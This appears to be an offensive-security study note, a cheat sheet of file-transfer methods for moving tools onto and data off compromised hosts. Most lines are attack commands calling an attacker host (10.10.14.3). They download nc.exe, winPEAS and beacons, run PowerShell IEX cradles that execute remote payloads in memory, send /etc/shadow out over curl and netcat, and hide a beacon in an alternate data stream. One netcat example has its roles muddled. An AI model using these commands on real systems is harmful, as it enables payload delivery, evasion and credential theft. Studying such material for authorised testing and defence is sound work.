# File Transfer Techniques

## Table of Contents
- [[#HTTP Servers (Attacker)|HTTP Servers (Attacker)]]
- [[#Downloads (Target)|Downloads (Target)]]
- [[#Uploads|Uploads]]
- [[#Netcat Transfers|Netcat Transfers]]
- [[#Base64 Transfers|Base64 Transfers]]
- [[#SMB Transfers|SMB Transfers]]
- [[#PowerShell IEX (In-Memory)|PowerShell IEX (In-Memory)]]
- [[#FTP Transfers|FTP Transfers]]
- [[#TFTP Transfers|TFTP Transfers]]
- [[#SCP Transfers|SCP Transfers]]
- [[#Certutil (Windows)|Certutil (Windows)]]
- [[#Print Sharing|Print Sharing]]
- [[#Reliable File Transfer Cheatsheet|Reliable File Transfer Cheatsheet]]
- [[#Related Notes|Related Notes]]

---

## HTTP Servers (Attacker)

Start a quick HTTP server on your attack machine to serve files.

### Python3 HTTP Server

```bash
# Basic
python3 -m http.server 80

# With specific directory
python3 -m http.server 8000 --directory /path/to/files

# Bind to specific interface
python3 -m http.server 8000 --bind 0.0.0.0
```

### Python2 HTTP Server

```bash
python2 -m SimpleHTTPServer 80
python2 -m SimpleHTTPServer 8000
```

### PHP HTTP Server

```bash
# PHP 5.4+ built-in server
php -S 0.0.0.0:8000

# With specific directory
php -S 0.0.0.0:8000 -t /path/to/files
```

### Ruby HTTP Server

```bash
ruby -run -e httpd . -p 8000

# Webrick
ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
```

### Ruby with specific path

```bash
ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => "/path/to/files").start'
```

### BusyBox HTTP Server

```bash
busybox httpd -f -p 8000
```

### NodeJS HTTP Server

```bash
npx http-server -p 8000
```

### Upload Server (Python)

```bash
# Create a simple file upload server
python3 -c '
import http.server, os
class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers["Content-Length"])
        with open(self.path[1:], "wb") as f:
            f.write(self.rfile.read(length))
        self.send_response(201)
http.server.HTTPServer(("0.0.0.0", 8000), UploadHandler).serve_forever()
'

# Then on target:
curl -T file.txt http://10.10.14.3:8000/
```

---

## Downloads (Target)

### Linux Downloads

#### wget

```bash
wget http://10.10.14.3:8000/linpeas.sh -O linpeas.sh
wget http://10.10.14.3:8000/exploit -q
wget --no-check-certificate https://10.10.14.3:8443/exploit
```

#### curl

```bash
curl http://10.10.14.3:8000/linpeas.sh -o linpeas.sh
curl -O http://10.10.14.3:8000/linpeas.sh  # Preserves filename
curl -s http://10.10.14.3:8000/exploit -o exploit
curl -k https://10.10.14.3:8443/exploit -o exploit  # Ignore SSL
```

#### aria2c

```bash
aria2c http://10.10.14.3:8000/file.zip
```

#### wget alternative (no cert check)

```bash
wget --no-check-certificate https://10.10.14.3/exploit
```

### Windows Downloads

#### PowerShell

```powershell
# Most common
Invoke-WebRequest -Uri http://10.10.14.3:8000/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Short alias
iwr -Uri http://10.10.14.3:8000/winPEAS.exe -OutFile winpeas.exe

# With proxy
iwr -Uri http://10.10.14.3:8000/beacon.exe -OutFile beacon.exe -Proxy http://proxy:8080
```

```powershell
# Using WebClient (more compatible - PowerShell 2.0+)
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.3:8000/nc.exe', 'C:\Windows\Temp\nc.exe')
```

```powershell
# Background download
Start-BitsTransfer -Source http://10.10.14.3:8000/file.exe -Destination C:\Temp\file.exe

# BITSAdmin (legacy)
bitsadmin /transfer job /download /priority high http://10.10.14.3:8000/file.exe C:\Temp\file.exe
```

#### Certutil

```cmd
certutil -urlcache -f http://10.10.14.3:8000/nc.exe nc.exe
certutil -urlcache -split -f http://10.10.14.3:8000/file.zip file.zip
```

> [!note]
> Certutil is a legacy utility on Windows but is very commonly available. It can be detected by AV.

#### Curl (Windows 10+)

```cmd
curl http://10.10.14.3:8000/nc.exe -o nc.exe
```

#### Bitsadmin

```cmd
bitsadmin /transfer n http://10.10.14.3:8000/nc.exe C:\Temp\nc.exe
```

#### Cmd.exe (using scriptlets)

```cmd
echo Set obj = CreateObject("MSXML2.XMLHTTP"):obj.open "GET","http://10.10.14.3:8000/nc.exe",False > %TEMP%\dl.vbs
echo If obj.Status = 200 Then > %TEMP%\dl.vbs
echo Set obj2 = CreateObject("ADODB.Stream"):obj2.Open > %TEMP%\dl.vbs
echo obj2.Type = 1:obj2.Write obj.ResponseBody > %TEMP%\dl.vbs
echo obj2.SaveToFile "nc.exe",2 > %TEMP%\dl.vbs
echo End If >> %TEMP%\dl.vbs
cscript %TEMP%\dl.vbs
```

#### Alternate Data Stream (ADS)

```powershell
# Download file to alternate data stream
Invoke-WebRequest -Uri http://10.10.14.3:8000/beacon.exe -OutFile C:\Windows\Tasks\store.txt:beacon.exe
```

---

## Uploads

### Upload from target to attacker

If you need to get files off the target (exfil):

#### Python upload server

```bash
# On attacker - start upload server
python3 -m pip install uploadserver
python3 -m uploadserver 8000
```

```bash
# On target
curl -X POST http://10.10.14.3:8000/upload -F "files=@/etc/shadow"
```

#### Netcat upload

```bash
# Attacker (receive)
nc -lvnp 4444 > received_file

# Target (send)
nc 10.10.14.3 4444 < /etc/shadow
```

#### PowerShell upload

```powershell
# Using WebClient Upload
(New-Object System.Net.WebClient).UploadFile('http://10.10.14.3:8000/upload', '/etc/shadow')

# Using Invoke-WebRequest (multipart)
Invoke-RestMethod -Uri http://10.10.14.3:8000/upload -Method Post -InFile file.txt
```

---

## Netcat Transfers

### Netcat (attacker receives, target sends — pull)

```bash
# Attacker (receive) — must start first!
nc -lvnp 4444 > received_file

# Target (send)
nc 10.10.14.3 4444 < file_to_send
```

### Netcat (attacker sends, target receives — push)

```bash
# Attacker (send)
nc 10.10.14.3 4444 < file_to_send

# Target (receive) — must start first!
nc -lvnp 4444 > received_file
```

### Netcat with progress indicator

```bash
# Attacker
pv file | nc -lvnp 4444

# Target
nc 10.10.14.3 4444 > file
```

### Ncat with SSL

```bash
# Attacker (receive encrypted)
ncat --ssl -lvnp 4444 > received_file

# Target (send encrypted)
ncat --ssl 10.10.14.3 4444 < file_to_send
```

---

## Base64 Transfers

Used when you have command execution but no direct file transfer mechanism.

### Step 1: Encode on attacker

```bash
base64 -w0 exploit.bin
# Outputs base64 string
```

Or from Kali:
```bash
cat exploit.bin | base64 | tr -d '\n'
```

### Step 2: Transfer (via command injection, shell, etc.)

```bash
# Target writes the base64 data
echo -n "BASE64_STRING_HERE" > /tmp/encoded.txt

# Or pipe directly to decode
echo -n "BASE64_STRING_HERE" | base64 -d > /tmp/exploit
```

### Step 3: Decode on target

```bash
# Linux
base64 -d /tmp/encoded.txt > /tmp/exploit
chmod +x /tmp/exploit

# Linux (busybox)
busybox base64 -d encoded.txt > exploit
```

### Windows Base64

```powershell
# Encode file to base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe"))

# Decode base64 to file
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("BASE64_STRING"))
```

### Split large base64 transfers

```bash
# Split into chunks
split -b 1000 encoded.b64 chunk_

# Send each chunk
cat chunk_aa | <method>
# ... recombine on target
cat chunk_* > encoded.b64 && base64 -d encoded.b64 > output
```

---

## SMB Transfers

### Impacket SMB Server (Linux attacker)

```bash
# Start SMB server
impacket-smbserver share . -smb2support

# With credentials
impacket-smbserver share /path/to/files -smb2support -username user -password pass

# On port 445 (requires root)
sudo impacket-smbserver share /path/to/files -smb2support
```

### Access from Windows

```cmd
# Copy from SMB share
copy \\10.10.14.3\share\file.exe C:\Temp\file.exe

# Execute directly from SMB
\\10.10.14.3\share\file.exe
```

### Access from Linux

```bash
# Mount first
mount -t cifs //10.10.14.3/share /mnt -o username=guest

# Or copy with smbclient
smbclient //10.10.14.3/share -c 'get file.txt'
```

---

## PowerShell IEX (In-Memory)

Execute scripts without writing to disk.

### Basic IEX download cradle

```powershell
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/script.ps1')
```

### IEX with Invoke-WebRequest

```powershell
IEX (IWR http://10.10.14.3:8000/script.ps1 -UseBasicParsing)
```

### IEX with aliases

```powershell
iex(iwr http://10.10.14.3:8000/script.ps1)
```

### IEX Net.WebClient short alias

```powershell
(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/shell.ps1') | IEX
```

### IEX with proxy support

```powershell
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
IEX $wc.DownloadString('http://10.10.14.3:8000/payload.ps1')
```

### IEX with SSL ignore

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://10.10.14.3:8443/payload.ps1')
```

### PowerShell DownloadString as Cradle

```powershell
# One-liner
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/payload.ps1')"

# Base64 encoded
powershell -enc <base64_encoded_cradle>
```

---

## FTP Transfers

### Python FTP server

```bash
# On attacker
python3 -m pyftpdlib -p 21 -w

# Or manually
python3 -c '
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
a = DummyAuthorizer()
a.add_anonymous("/path/to/files", perm="elradfmw")
h = FTPHandler
h.authorizer = a
s = FTPServer(("0.0.0.0", 21), h)
s.serve_forever()
'
```

### FTP from Windows

```cmd
echo open 10.10.14.3 > ftp.txt
echo anonymous >> ftp.txt
echo ftp >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### FTP from Linux

```bash
ftp 10.10.14.3
# interactive or with script
```

---

## TFTP Transfers

### TFTP Server (attacker)

```bash
# On Kali
sudo apt install atftp
sudo atftpd --daemon --port 69 /path/to/files

# Or with metasploit
use auxiliary/server/tftp
set TFTPROOT /path/to/files
run
```

### TFTP Client (target)

```bash
# Linux
tftp 10.10.14.3 69
tftp> get file.exe
tftp> quit

# Windows (if installed)
tftp -i 10.10.14.3 GET file.exe
```

---

## SCP Transfers

### From target to attacker (push)

```bash
# Requires SSH from target to attacker
scp /path/to/local/file user@10.10.14.3:/path/to/destination/
```

### From attacker to target (pull)

```bash
# If you have SSH on the target
scp user@target:/path/to/remote/file /path/to/local/
```

---

## Certutil (Windows)

```cmd
certutil -urlcache -split -f http://10.10.14.3:8000/file.exe file.exe
certutil -urlcache -f http://10.10.14.3:8000/file.txt file.txt
```

> [!caution]
> Certutil is deprecated but still present on most Windows systems. It's widely signatured by AV/EDR.

---

## Print Sharing

### Using Windows printer to share files (advanced)

```cmd
# Print to file
net use LPT1 \\10.10.14.3\share /persistent:yes
```

---

## Reliable File Transfer Cheatsheet

### Fastest method — Python HTTP

```bash
# Attacker
python3 -m http.server 80

# Target
wget http://10.10.14.3/nc.exe
curl http://10.10.14.3/nc.exe -o nc.exe
```

### Most reliable (no method assumed) — Base64

```bash
# Attacker
cat file | base64 -w0

# Target
echo "BASE64" | base64 -d > file
```

### In-memory execution (no disk) — PowerShell IEX

```powershell
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3/script.ps1')
```

### Windows to Windows — SMB

```cmd
copy \\10.10.14.3\share\file.exe C:\Temp\
```

### Encrypted transfer — Ncat SSL

```bash
# Attacker
ncat --ssl -lvnp 4444 > received

# Target
ncat --ssl 10.10.14.3 4444 < file
```

---

## Related Notes

- [[06 - Shells and Payloads/6.1 Reverse Shells/Reverse Shell Compendium]]
- [[06 - Shells and Payloads/6.4 Payload Generation/MSFVenom Reference]]
- [[12 - Pivoting and Port Forwarding/Pivoting Techniques]]
- [[07 - Metasploit Framework/Metasploit Complete]]
